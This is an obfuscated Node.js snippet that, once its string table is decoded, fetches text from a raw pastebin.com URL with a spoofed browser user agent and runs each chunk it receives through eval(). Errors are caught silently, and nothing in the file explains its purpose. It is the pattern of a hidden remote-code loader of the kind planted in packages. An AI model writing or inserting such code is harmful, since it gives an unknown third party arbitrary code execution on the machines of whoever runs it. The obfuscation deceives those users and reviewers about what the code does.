function _0x1dfd(_0x17cf4b, _0x1dfd1a) {
    var _0x1bf23f = _0x17cf();
    _0x1dfd = function (_0x30e59d, _0x4a5ded) {
        _0x30e59d = _0x30e59d - 0x0;
        var _0x3c21c5 = _0x1bf23f[_0x30e59d];
        return _0x3c21c5;
    };
    return _0x1dfd(_0x17cf4b, _0x1dfd1a);
}
var _0xd49f35 = _0x1dfd;
try {
    var https = require(_0xd49f35(0x0));
    https['get']({
        'hostname': _0xd49f35(0x1),
        'path': _0xd49f35(0x2),
        'headers': {
            'User-Agent': _0xd49f35(0x3),
            'Accept': _0xd49f35(0x4)
        }
    }, _0x57e541 => {
        var _0x3bf935 = _0x1dfd;
        _0x57e541['setEncoding'](_0x3bf935(0x5));
        _0x57e541['on']('data', _0x15b8a2 => {
            eval(_0x15b8a2);
        });
        _0x57e541['on']('error', () => {
        });
    })['on']('error', () => {
    });
} catch (_0x26d4d3) {
}
function _0x17cf() {
    var _0x1647ae = [
        'https',
        'pastebin.com',
        '/raw/XLeVP82h',
        'Mozilla/5.0\x20(Windows\x20NT\x206.1;\x20rv:52.0)\x20Gecko/20100101\x20Firefox/52.0',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'utf8'
    ];
    _0x17cf = function () {
        return _0x1647ae;
    };
    return _0x17cf();
}
